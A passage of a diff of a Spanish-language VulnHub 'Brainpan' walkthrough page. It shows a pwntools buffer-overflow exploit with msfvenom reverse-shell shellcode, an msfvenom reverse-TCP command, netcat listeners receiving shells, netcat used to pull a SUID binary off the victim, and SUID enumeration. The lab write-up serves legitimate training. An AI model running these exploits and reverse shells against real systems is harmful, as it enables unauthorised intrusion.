-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf9\x82\xaf\x77\xbd\x1c\x4e\x78\xbe\x35\x95</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2c\xee\x2d\x3c\x4d\x65\xad\xc1\x98\x2a\xfd</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6d\x73\x8b\xad\xcd\x23\x63\xa7\xc1\x1c\x93</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc8\x0b\x35\x3e\x33\xdc\xfa\x17\x5f\x55\x93</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x65\x9f\x64\xd8\xe3\x79\x0c\x0e\xa2\xd2\xb9</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb7\xef\xa8\x58\x37\x3a\xd5\x5b\xb3\xc9\x2a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x15\x34\xa7\x38\xc2\xb4\xf2\x62\x45\xca\x28</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0a\x09\x59\xb7\xca\x44\x42\x60\x9d\x01\xb4</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x79\x4b\xbc\xef\xd3\x69\x3d\x69\x1b\x29\x9a</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4a\xa2\xb0\x6f\xf6\x80\xa2\xa9\xf7\x8c\x96</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x65\xae\x5a\x40\xc0\x18\x2d\x3a\x9a\xf7\xe7</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\x5b\x34\x38\xac\x63\x11\xce\x50\xd5\xcc</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x97\x6f\xda\x98\x1f\x08\x06\x39\xdf\xc3\x82</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x49\xaa\x49\xa2\xc1\x73\x18\xf6\x8f\x83\xf7</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x35\xb6\x07\xfd\xc5\x4d\x17\x74\xc3\x0a\x9f</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x65\xb9\x03\x4a\x89\x6e\x23\x5f\x89\x90\xdb</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x37\xc9\x1e\xb2\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\xcb\x21\x9c\xb2\x33\xb2\xc1\x3b</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd6\x83\xc1\x58\x93\xb4\xf1\x2b\xf1\x38\x79</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x79\xe1\xcb\x0f\x56\x06\x7b\xa5\x80\x29\x7c</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x96\xf1\x28\xfe\xe5\x25\x8a\x3f\x26\x38\xcb</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x78\x5b\xb1\x99\xd1\x17\x64\x0d\x55\x6d\xb5</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa6\x25\x63\xbd\x5b\xfd\x82\xec\xca\x75\xdd</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2e\xed\x5a\x55\x67\xf5\xbf\x50\x31\x8e\x74</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2e\xc0\x46\x45\xcf\x6f\xa7\x69\x22\x71\xe0</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\xdd\x04\x18\xad\x60\x1f\xdf\xcf\xbe\xaa</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\x68\x34\x0c\x27\x88\x99\xcb\xac\x86\x56</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x9f\xea\x8a\x69\x4c\x81\xb7\xe2\x73\x45\x3e</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb0\x57\x41\x1a\x62\xf9\xd0\xc6\xc5\x06\x02</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa9\xba\xa2\x49\x44\xae\xde\x10\x01\x03\xd3</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\xd1\x0b\x64\xd9\xe3\x94\xde\x75\x48\x5c</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf9\x82\xaf\x77\xbd\x1c\x4e\x78\xbe\x35\x95</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2c\xee\x2d\x3c\x4d\x65\xad\xc1\x98\x2a\xfd</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6d\x73\x8b\xad\xcd\x23\x63\xa7\xc1\x1c\x93</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc8\x0b\x35\x3e\x33\xdc\xfa\x17\x5f\x55\x93</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x65\x9f\x64\xd8\xe3\x79\x0c\x0e\xa2\xd2\xb9</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb7\xef\xa8\x58\x37\x3a\xd5\x5b\xb3\xc9\x2a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x15\x34\xa7\x38\xc2\xb4\xf2\x62\x45\xca\x28</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0a\x09\x59\xb7\xca\x44\x42\x60\x9d\x01\xb4</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x79\x4b\xbc\xef\xd3\x69\x3d\x69\x1b\x29\x9a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4a\xa2\xb0\x6f\xf6\x80\xa2\xa9\xf7\x8c\x96</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x65\xae\x5a\x40\xc0\x18\x2d\x3a\x9a\xf7\xe7</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\x5b\x34\x38\xac\x63\x11\xce\x50\xd5\xcc</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x97\x6f\xda\x98\x1f\x08\x06\x39\xdf\xc3\x82</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x49\xaa\x49\xa2\xc1\x73\x18\xf6\x8f\x83\xf7</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x35\xb6\x07\xfd\xc5\x4d\x17\x74\xc3\x0a\x9f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x65\xb9\x03\x4a\x89\x6e\x23\x5f\x89\x90\xdb</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x60</span><span class="s">"</span><span class="p">
 
 payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
@@ -988,10 +536,24 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora al ejecutar este script nos llegua la <code class="language-plaintext highlighter-rouge">shell</code> sin ningun problema como antes</p>
+<p class="plain-text">Nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">netcat</code> y corremos el <code class="language-plaintext highlighter-rouge">exe</code> desde una shell normal.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\brainpan.exe</span><span class="p">
+[+] initializing winsock...done.
+[+] server socket created.
+[+] bind done on port 9999
+[+] waiting for connections.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y el programa corrompe devolviendo al instante una shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done
 [</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
 </code></pre></div></div><br>
 
@@ -1000,45 +562,41 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span>
 Listening on 0.0.0.0 443
 Connection received on 192.168.100.5
 Microsoft Windows [Versión 10.0.23430.1000]
-(c) Microsoft Corporation. Todos los derechos reservados.  
+(c) Microsoft Corporation. Todos los derechos reservados.
 
-C:\Windows\System32></span><span class="am">whoami</span><span class="p">
+C:\Windows\System32> </span><span class="am">whoami</span><span class="p">
 xchg2pwn\user
 
 C:\Windows\System32></span>
 </code></pre></div></div><br>
 
-</section>
-
-<section class="post" id="shell-puck">
-<br><h3 class="post-title">Shell - puck</h3><br>
-
-<p class="plain-text">Ahora que funciona simplemente cambiamos la dirección ip de el apartado de <code class="language-plaintext highlighter-rouge">remote</code></p>
+<p class="plain-text">Ahora funciona y simplemente cambiamos la dirección ip de el apartado de <code class="language-plaintext highlighter-rouge">remote</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"192.168.100.2"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)  </span>
+<code><span class="p">shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"192.168.100.2"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Corremos el exploit y recibimos una <code class="language-plaintext highlighter-rouge">shell</code> de la máquina victima en la unidad <code class="language-plaintext highlighter-rouge">Z:</code></p>
+<p class="plain-text">Corremos el exploit y recibimos una <code class="language-plaintext highlighter-rouge">shell</code> de la máquina victima en la unidad <code class="language-plaintext highlighter-rouge">Z:</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.2 on port 9999: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.2 on port 9999: Done
 [</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.2 port 9999</span>
 </code></pre></div></div><br>
+
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
 Listening on 0.0.0.0 443
-Connection received on 192.168.100.2  
+Connection received on 192.168.100.2
 CMD Version 1.4.1
 
-Z:\home\puck></span><span class="am">whoami</span><span class="p">
+Z:\home\puck> </span><span class="am">whoami</span><span class="p">
 File not found.
 
 Z:\home\puck></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">No podemos hacer un simple <code class="language-plaintext highlighter-rouge">whoami</code>, sin embargo al mirar la estrucrura de los directorios en la <code class="language-plaintext highlighter-rouge">raiz</code> podemos ver que la estructura es la de un <code class="language-plaintext highlighter-rouge">Linux</code></p>
+<p class="plain-text">No podemos hacer un simple <code class="language-plaintext highlighter-rouge">whoami</code>, sin embargo al mirar la estrucrura de los directorios en la <code class="language-plaintext highlighter-rouge">raíz</code> podemos ver que la estructura es la de un <code class="language-plaintext highlighter-rouge">Linux</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Z:\home\puck></span><span class="am">dir</span><span class="p"> Z:\
+<code><span class="p">Z:\home\puck> </span><span class="am">dir</span><span class="p"> Z:\
 Volume in drive Z has no label.
 Volume Serial Number is 0000-0000
 
@@ -1066,27 +624,27 @@ Directory of Z:
  2/25/2013   2:32 PM     5,180,432  vmlinuz
  2/25/2013   2:32 PM     5,180,432  vmlinuz.old
        4 files               40,530,298 bytes
-      17 directories     13,849,333,760 bytes free  
+      17 directories     13,849,333,760 bytes free
 
 Z:\home\puck></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Basta con ejecutar la ruta absoluta del binario <code class="language-plaintext highlighter-rouge">sh</code> para obtener una shell de <code class="language-plaintext highlighter-rouge">Linux</code></p>
+<p class="plain-text">Basta con ejecutar la ruta absoluta del binario <code class="language-plaintext highlighter-rouge">sh</code> para obtener una shell de <code class="language-plaintext highlighter-rouge">Linux</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Z:\home\puck></span><span class="am">/bin/sh</span><span class="p">
+<code><span class="p">Z:\home\puck> </span><span class="am">/bin/sh</span><span class="p">
 sh: turning off NDELAY mode
 
 script /dev/null -c bash
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
-uid=1002(puck) gid=1002(puck) groups=1002(puck)  
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
 192.168.100.2 
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Otra forma es cambiando el payload <code class="language-plaintext highlighter-rouge">msfvenom</code> a uno de linux x86 para recibir una sh</p>
+<p class="plain-text">Otra forma es cambiando el payload <code class="language-plaintext highlighter-rouge">msfvenom</code> a uno de linux x86 para recibir una sh.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x86/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x86/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -1107,7 +665,7 @@ shellcode += b"\x98\xd0\x0c\x7e\x3a\x48\xda\x63\xe8\xd9\x55"
 shellcode += b"\x82\xbc\xd5\xa8\xc5\xbc\xe9\x32\xc6"</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Modificamos el script, lo ejecutamos y recibimos directamente una sh de Linux</p>
+<p class="plain-text">Modificamos el script, lo ejecutamos y recibimos directamente una sh de Linux.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
@@ -1116,14 +674,14 @@ offset</span><span class="o"> =</span><span class="mi"> 524</span><span class="p
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
 shellcode</span><span class="o"> =</span><span class="no">  b</span><span class="s">""</span><span class="p">
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x2d\x10\x84\x11\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x1c\xcb\x73\xf2\x0d\xa8\x28\x9f</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb3\xa7\x2e\xef\xd5\x7a\x30\x83\x40\x35\x0e</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x69\xf2\x7c\x08\x88\x9a\xbe\x42\x0e\x13\x57</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x91\xcf\xa2\x1c\x1c\x2e\x14\x04\x4f\xe0\x07</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7a\x6c\x8b\x46\xb1\xf3\xd9\xe0\x24\xdb\xae</span><span class="s">"</span><span class="p">  
-shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x98\xd0\x0c\x7e\x3a\x48\xda\x63\xe8\xd9\x55</span><span class="s">"</span><span class="p">  
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x2d\x10\x84\x11\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x1c\xcb\x73\xf2\x0d\xa8\x28\x9f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb3\xa7\x2e\xef\xd5\x7a\x30\x83\x40\x35\x0e</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x69\xf2\x7c\x08\x88\x9a\xbe\x42\x0e\x13\x57</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x91\xcf\xa2\x1c\x1c\x2e\x14\x04\x4f\xe0\x07</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7a\x6c\x8b\x46\xb1\xf3\xd9\xe0\x24\xdb\xae</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x98\xd0\x0c\x7e\x3a\x48\xda\x63\xe8\xd9\x55</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x82\xbc\xd5\xa8\xc5\xbc\xe9\x32\xc6</span><span class="s">"</span><span class="p">
 
 payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
@@ -1135,19 +693,18 @@ shell</span><span class="o"> =</span><span class="p"> remote(</span><span class=
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.2 on port 9999: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.2 on port 9999: Done
 [</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.2 port 9999</span>
 </code></pre></div></div><br>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
 Listening on 0.0.0.0 443
-Connection received on 192.168.100.2  
+Connection received on 192.168.100.2
 script /dev/null -c bash
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
-uid=1002(puck) gid=1002(puck) groups=1002(puck)  
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
 192.168.100.2
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
@@ -1157,9 +714,9 @@ uid=1002(puck) gid=1002(puck) groups=1002(puck)
 <section class="post" id="shell-anansi">
 <br><h3 class="post-title">Shell - anansi</h3><br>
 
-<p class="plain-text">Buscando archivos <code class="language-plaintext highlighter-rouge">suid</code> hay uno que sobresale, un binario personalizado <code class="language-plaintext highlighter-rouge">validate</code></p>
+<p class="plain-text">Buscando archivos <code class="language-plaintext highlighter-rouge">suid</code> hay uno que sobresale, un binario personalizado <code class="language-plaintext highlighter-rouge">validate</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null  
+<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null
 /bin/umount
 /bin/su
 /bin/mount
@@ -1180,50 +737,51 @@ uid=1002(puck) gid=1002(puck) groups=1002(puck)
 /usr/sbin/uuidd
 /usr/sbin/pppd
 /usr/local/bin/validate
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/openssh/ssh-keysign
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/pt_chown
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El binario pertenece al usuario <code class="language-plaintext highlighter-rouge">anansi</code> y tiene el privilegio <code class="language-plaintext highlighter-rouge">suid</code> en los permisos</p>
+<p class="plain-text">El binario pertenece al usuario <code class="language-plaintext highlighter-rouge">anansi</code> y tiene el privilegio <code class="language-plaintext highlighter-rouge">suid</code> en los permisos.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/local/bin/validate
--rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 </span><span class="err">/usr/local/bin/validate</span><span class="p">  
+-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 </span><span class="err">/usr/local/bin/validate</span><span class="p">
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutarlo nos pide un <code class="language-plaintext highlighter-rouge">input</code>, asi que le pasamos <code class="language-plaintext highlighter-rouge">test</code> como input aunque realmente no queda muy claro que es lo que hace con el, solo devuelve un <code class="language-plaintext highlighter-rouge">mensaje</code></p>
+<p class="plain-text">Al ejecutarlo nos pide un <code class="language-plaintext highlighter-rouge">input</code>, asi que le pasamos <code class="language-plaintext highlighter-rouge">test</code> como input aunque realmente no queda muy claro que es lo que hace con él, solo devuelve un mensaje.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate
 usage validate &ltinput>
-</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate test  
+</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate test
 validating input...passed.
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos descargar el <code class="language-plaintext highlighter-rouge">binario</code> en nuestra máquina para analizarlo usando <code class="language-plaintext highlighter-rouge">netcat</code></p>
+<p class="plain-text">Podemos descargar el <code class="language-plaintext highlighter-rouge">binario</code> usando <code class="language-plaintext highlighter-rouge">netcat</code> a nuestra máquina para analizarlo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 192.168.100.85 4444 < /usr/local/bin/validate  
+<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 192.168.100.73 4444 < /usr/local/bin/validate
 </span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
 </code></pre></div></div><br>
+
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > validate  
+<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > validate
 Listening on 0.0.0.0 4444
-Connection received on 192.168.100.2  </span>
+Connection received on 192.168.100.2</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para analizarlo podemos abrir el binario con <code class="language-plaintext highlighter-rouge">ida</code> y asi ver el desensamblado, la función <code class="language-plaintext highlighter-rouge">main</code> inicia mostrando un mensaje con printf y llamando a la función validate pasandole el contenido del primer argumento y luego hace un salto condicional</p>
+<p class="plain-text">Para analizarlo podemos abrir el binario con <code class="language-plaintext highlighter-rouge">ida</code> y ver el desensamblado, la función <code class="language-plaintext highlighter-rouge">main</code> inicia mostrando un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> y llamando a la función <code class="language-plaintext highlighter-rouge">validate</code> pasandole el contenido del primer argumento y luego hace un salto condicional.</p>
 <a href="/vulnhub/brainpan1/8.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/8.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">validate</code> recibe el argumento e inicia declarando un iterador llamado <code class="language-plaintext highlighter-rouge">i</code> a <code class="language-plaintext highlighter-rouge">0</code>, toma la longitud del argumento con <code class="language-plaintext highlighter-rouge">strlen</code> que es muy probable que sea el tope del bucle sobre el que se va a iterar para realizar otras operaciones que analizaremos</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">validate</code> recibe el argumento e inicia declarando un iterador llamado <code class="language-plaintext highlighter-rouge">i</code> a <code class="language-plaintext highlighter-rouge">0</code>, toma la longitud del argumento con <code class="language-plaintext highlighter-rouge">strlen</code> que es muy probable que sea el tope del bucle sobre el que se va a iterar para realizar otras operaciones que analizaremos.</p>
 <a href="/vulnhub/brainpan1/10.png" target="_blank"><div><p><img src="/vulnhub/brainpan1/10.png"></p></div></a>
 
